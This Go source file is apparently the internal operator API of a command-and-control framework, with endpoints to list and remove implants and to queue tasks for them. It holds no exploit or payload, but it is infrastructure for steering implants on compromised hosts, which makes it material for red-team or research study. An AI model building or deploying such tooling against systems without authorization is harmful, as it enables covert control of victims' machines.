package c2int

import (
	"crypto/tls"
	"encoding/json"
	"errors"
	"net/http"
	"path/filepath"

	"github.com/dovelus/corb4n-c2/server/comunication"
	"github.com/dovelus/corb4n-c2/server/db"
	"github.com/gorilla/mux"
)

// logRequest is a middleware that logs the details of each request
func logRequest(handler http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		comunication.Logger.Infof("Received request: %s %s from %s", req.Method, req.URL.Path, req.RemoteAddr)
		handler.ServeHTTP(w, req)
	})
}

// Handler function to get all implants
func handleGetAllImplants(w http.ResponseWriter, _ *http.Request) {
	implants, err := db.GetAllImplants()
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to get all implants: %v", err)
		return
	}

	implantsJSON, err := json.Marshal(implants)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to encode implants: %v", err)
		return
	}

	// Log the readable JSON string
	comunication.Logger.Infof("implants JSON: %s", string(implantsJSON))

	w.Header().Set("Content-Type", "application/json")
	_, err = w.Write(implantsJSON)
	if err != nil {
		return
	}
}

// Handler function to remove an implant
func handleRemoveImplant(w http.ResponseWriter, r *http.Request) {
	var data struct {
		ID string `json:"id"`
	}
	err := json.NewDecoder(r.Body).Decode(&data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode remove implant request: %v", err)
		return
	}

	err = db.RemoveImplant(data.ID)
	if errors.Is(err, comunication.ErrNoResults) {
		http.Error(w, err.Error(), http.StatusNotFound)
		comunication.Logger.Errorf("no results found: %v", err)
		return
	}

	w.WriteHeader(http.StatusOK)
}

// Handler function to get all tasks
func handleGetAllTasks(w http.ResponseWriter, r *http.Request) {
	var data struct {
		Completed bool `json:"completed"`
	}

	err := json.NewDecoder(r.Body).Decode(&data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode get all tasks request: %v", err)
		return
	}

	tasks, err := db.GetAllTasks(data.Completed)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to get all tasks: %v", err)
		return
	}

	tasksJSON, err := json.Marshal(tasks)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to encode tasks: %v", err)
		return
	}

	// Log the readable JSON string
	comunication.Logger.Infof("tasks JSON: %s", string(tasksJSON))

	w.Header().Set("Content-Type", "application/json")
	_, err = w.Write(tasksJSON)
	if err != nil {
		return
	}

}

// Handler function to create a task for an implant
func handleCreateTaskForImplant(w http.ResponseWriter, r *http.Request) {
	var task db.Implant_Task
	err := json.NewDecoder(r.Body).Decode(&task)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		comunication.Logger.Errorf("failed to decode create task for implant request: %v", err)
		return
	}

	task.TaskID = comunication.GenerateID()
	task.CreatedAt = comunication.CurrentUnixTimestamp()
	task.Completed = false
	task.CompletedAt = 0
	task.TaskResult = nil

	err = db.AddTask(&task)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		comunication.Logger.Errorf("failed to add task: %v", err)
		return
	}

	w.WriteHeader(http.StatusOK)
}

// StartIntHTTPServer starts the external HTTP server
func StartIntHTTPServer() {
	serverCertPath, err := filepath.Abs(filepath.Join("certs", "server.crt"))
	if err != nil {
		comunication.Logger.Fatalf("failed to get absolute path for server certificate: %v", err)
	}
	serverKeyPath, err := filepath.Abs(filepath.Join("certs", "server.key"))
	if err != nil {
		comunication.Logger.Fatalf("failed to get absolute path for server key: %v", err)
	}

	tlsConfig := &tls.Config{
		Certificates: make([]tls.Certificate, 1),
	}

	tlsConfig.Certificates[0], err = tls.LoadX509KeyPair(serverCertPath, serverKeyPath)
	if err != nil {
		comunication.Logger.Fatalf("failed to load server certificate: %v", err)
	}

	r := mux.NewRouter()
	r.Use(logRequest)
	r.HandleFunc("/getAllImplants", handleGetAllImplants).Methods("GET")
	r.HandleFunc("/removeImplant", handleRemoveImplant).Methods("POST")
	r.HandleFunc("/getAllTasks", handleGetAllTasks).Methods("POST")
	r.HandleFunc("/createTaskForImplant", handleCreateTaskForImplant).Methods("POST")

	srv := &http.Server{
		Addr:         "localhost:9443",
		Handler:      r,
		TLSConfig:    tlsConfig,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler)),
	}
	comunication.Logger.Infof("Starting internal HTTPs server on %s", srv.Addr)
	comunication.Logger.Fatal(srv.ListenAndServeTLS("", ""))
}
